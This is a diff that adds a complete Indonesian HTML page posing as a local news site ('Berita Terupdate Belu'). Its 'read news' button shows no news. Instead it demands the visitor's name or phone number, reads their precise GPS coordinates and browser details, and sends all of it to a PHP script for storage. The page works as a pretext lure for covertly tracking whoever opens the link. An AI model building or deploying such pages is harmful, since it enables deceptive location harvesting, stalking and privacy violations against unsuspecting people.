@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Berita Terupdate Belu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+            padding: 20px;
+            color: white;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2);
+            display: inline-block;
+            max-width: 400px;
+            width: 100%;
+            color: black;
+        }
+        button {
+            background-color: #007BFF;
+            color: white;
+            padding: 12px 25px;
+            font-size: 18px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+        }
+        button:hover {
+            background-color: #0056b3;
+            transform: scale(1.05);
+        }
+        #location, #device {
+            margin-top: 20px;
+            font-size: 16px;
+            background: #f9f9f9;
+            padding: 12px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: left;
+            word-break: break-word;
+        }
+        input {
+            margin-top: 10px;
+            padding: 10px;
+            width: 80%;
+            max-width: 300px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Konfirmasi Nama/No HP</h2>
+        <input type="text" id="phoneNumber" placeholder="Masukkan Nama/Nomor HP">
+        <br>
+        <button onclick="getLocation()">Baca Berita</button>
+        <p id="location"></p>
+        <p id="device"></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            let phone = document.getElementById("phoneNumber").value;
+            if (phone === "") {
+                alert("Harap masukkan nomor HP terlebih dahulu!");
+                return;
+            }
+
+            let deviceInfo = navigator.userAgent;
+            document.getElementById("device").innerHTML = "<strong>Perangkat:</strong> " + deviceInfo;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => saveToDatabase(position, phone, deviceInfo),
+                    showError
+                );
+            } else {
+                document.getElementById("location").innerHTML = "Geolokasi tidak didukung oleh browser ini.";
+            }
+        }
+
+        function saveToDatabase(position, phone, deviceInfo) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            document.getElementById("location").innerHTML = "<strong>Latitude:</strong> " + latitude + "<br><strong>Longitude:</strong> " + longitude;
+
+            // Kirim data ke PHP menggunakan AJAX
+            let formData = new FormData();
+            formData.append("phone", phone);
+            formData.append("latitude", latitude);
+            formData.append("longitude", longitude);
+            formData.append("device", deviceInfo);
+
+            fetch("simpan_data.php", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => alert(data))
+            .catch(error => console.error("Error:", error));
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("location").innerHTML = "Pengguna menolak permintaan geolokasi.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("location").innerHTML = "Informasi lokasi tidak tersedia.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("location").innerHTML = "Permintaan lokasi habis waktu.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("location").innerHTML = "Terjadi kesalahan yang tidak diketahui.";
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
